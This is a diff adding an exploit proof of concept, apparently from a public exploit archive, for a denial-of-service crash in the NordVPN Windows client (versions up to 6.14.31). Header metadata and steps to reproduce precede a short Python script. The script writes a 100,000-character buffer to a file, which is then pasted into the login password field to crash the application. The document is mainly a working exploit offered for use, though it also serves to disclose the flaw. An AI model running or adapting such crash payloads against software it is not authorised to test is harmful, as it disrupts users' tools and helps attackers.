@@ -1,0 +1,24 @@
+# Exploit Title: Nord VPN <= 6.14.31 - Denial of Service (PoC)
+# Exploit Author : L0RD (borna nematzadeh)
+# Contact: borna.nematzadeh123@gmail.com
+# Date: 2018-08-30
+# Vendor Homepage : https://nordvpn.com
+# Software link: https://nordvpn.com/download/
+# Version: <= 6.14.31
+# Tested on: Windows 10
+# CVE: N/A
+
+# Steps to reproduce:
+# 1) Run the python exploit code and open "nord.txt" file
+# 2) Copy the content of file
+# 3) Open Nord vpn
+# 4) Put anything (like test@test.com) into username field and paste content of "nord.txt" into password
+# 5) Crash!
+
+#!/usr/bin/python
+
+buffer = "\x41" * 100000
+f = open ("nord.txt", "w")
+f.write(buffer)
+f.close()
+print "File created"
